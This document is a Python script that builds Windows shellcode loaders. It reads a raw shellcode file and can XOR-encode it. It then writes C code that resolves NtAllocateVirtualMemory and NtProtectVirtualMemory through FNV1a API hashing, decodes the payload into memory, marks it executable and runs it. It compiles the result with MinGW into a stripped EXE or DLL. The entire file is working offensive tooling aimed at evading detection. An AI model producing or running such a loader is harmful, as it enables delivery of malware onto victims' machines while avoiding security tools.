import os
import sys
import subprocess
import random

# ---------------- FNV1a ----------------
FNV_PRIME = 0x01000193
FNV_OFFSET = 0x811c9dc5

def hash_string(name: str) -> int:
    h = FNV_OFFSET
    for b in name.encode():
        h ^= b
        h = (h * FNV_PRIME) & 0xffffffff
    return h

# ---------------- GCC discovery ----------------
gcc_names = ["x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32-gcc.exe"]

paths = os.environ.get("PATH", "").split(os.pathsep)

found = next(
    (os.path.join(dir_path, gcc)
     for dir_path in paths
     for gcc in gcc_names
     if os.path.isfile(os.path.join(dir_path, gcc)) and os.access(os.path.join(dir_path, gcc), os.X_OK)),
    None
)

if not found:
    print("[!] MinGW-w64 GCC not found")
    sys.exit(1)

# ---------------- args ----------------
if len(sys.argv) < 3 or sys.argv[1][0] == "-" or sys.argv[2][0] == "-":
    script_name = os.path.basename(sys.argv[0])
    print(f"Usage: {script_name} <shellcode.bin> <output.exe> [-dll] [-xor] [-l <key_length>] [-k <key>]")
    sys.exit(1)

bin_file = sys.argv[1]
output_exe = sys.argv[2]
use_dll = "-dll" in sys.argv
use_xor = "-xor" in sys.argv or "-i" in sys.argv or "-l" in sys.argv or "-k" in sys.argv

# ---------------- XOR key ----------------
key_length = 1
key = [random.randint(1, 255) for _ in range(key_length)]

if "-l" in sys.argv:
    l_index = sys.argv.index("-l")
    key_length = int(sys.argv[l_index + 1])
    key = [random.randint(1, 255) for _ in range(key_length)]

if "-k" in sys.argv:
    k_value = sys.argv[sys.argv.index("-k") + 1]

    if "," in k_value:
        key = [int(b, 0) for b in k_value.split(",")]
    elif k_value.startswith("0x") and len(k_value) > 2:
        hex_str = k_value[2:]
        if len(hex_str) % 2 != 0:
            hex_str = "0" + hex_str
        key = [int(hex_str[i:i+2], 16) for i in range(0, len(hex_str), 2)]
    else:
        key = [int(k_value, 0)]

    key_length = len(key)

# ---------------- read shellcode ----------------
try:
    with open(bin_file, "rb") as f:
        shellcode = f.read()
except FileNotFoundError:
    print(f"[-] File not found: {bin_file}")
    sys.exit(1)

def xor_bytes(data: bytes, key: list[int]) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def bytes_to_c_array(b: bytes) -> str:
    return ",".join(f"0x{byte:02x}" for byte in b)

# ---------------- hashes ----------------
hash_ntdll = hash_string("ntdll.dll")
hash_ntalloc = hash_string("NtAllocateVirtualMemory")
hash_ntprotect = hash_string("NtProtectVirtualMemory")

# ---------------- shellcode encoding ----------------
if use_xor:
    xor_shellcode = xor_bytes(shellcode, key)
else:
    xor_shellcode = shellcode

shellcode_array = bytes_to_c_array(xor_shellcode)
key_array = bytes_to_c_array(key)

# ---------------- C code ----------------
c_code = f'''#include "winapi_loader.h"

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

__attribute__((section(".text"), aligned(1))) unsigned char shellcode[] = {{ {shellcode_array} }};

#ifdef XOR
__attribute__((section(".text"), aligned(1))) unsigned char key[] = {{ {key_array} }};
#endif

#define HASH_NTDLL 0x{hash_ntdll:08x}
#define HASH_NtAllocateVirtualMemory 0x{hash_ntalloc:08x}
#define HASH_NtProtectVirtualMemory 0x{hash_ntprotect:08x}

__attribute__((section(".text.start")))
void _start() {{

    HMODULE hNtdll = myGetModuleHandleH(HASH_NTDLL);

    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory =
        (NtAllocateVirtualMemory_t)myGetProcAddressH(hNtdll, HASH_NtAllocateVirtualMemory);

    NtProtectVirtualMemory_t pNtProtectVirtualMemory =
        (NtProtectVirtualMemory_t)myGetProcAddressH(hNtdll, HASH_NtProtectVirtualMemory);

    LPVOID execMemory = NULL;
    SIZE_T regionSize = sizeof(shellcode);

    pNtAllocateVirtualMemory(
        (HANDLE)-1,
        &execMemory,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    for (SIZE_T i = 0; i < sizeof(shellcode); i++)
    #ifdef XOR
        ((unsigned char*)execMemory)[i] = shellcode[i] ^ key[i % sizeof(key)];
    #else
        ((unsigned char*)execMemory)[i] = shellcode[i];
    #endif

    ULONG oldProtect;

    pNtProtectVirtualMemory(
        (HANDLE)-1,
        &execMemory,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    ((void(*)())execMemory)();
}}
'''

# ---------------- compile ----------------
compile_cmd = [
    "x86_64-w64-mingw32-gcc",
    "-nostdlib", "-nostartfiles",
    "-Wl,-subsystem,windows", "-e", "_start",
    "-Os", "-s", "-fno-ident", "-flto",
    "-Wl,--exclude-all-symbols",
    "-Wl,--no-insert-timestamp",
    "-fno-asynchronous-unwind-tables",
    "-x", "c", "-", "-o", output_exe
]

if use_xor:
    compile_cmd.append("-DXOR")

if use_dll:
    compile_cmd.extend(["-shared"])

proc = subprocess.run(
    compile_cmd,
    input=c_code.encode(),
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

if proc.returncode != 0:
    print(proc.stderr.decode())
    sys.exit(1)

if use_xor and use_dll:
    print(f"[+] DLL generated: {output_exe} (XOR key: {key_array})")
elif use_dll:
    print(f"[+] DLL generated: {output_exe}")
elif use_xor:
    print(f"[+] Executable generated: {output_exe} (XOR key: {key_array})")
else:
    print(f"[+] Executable generated: {output_exe}")
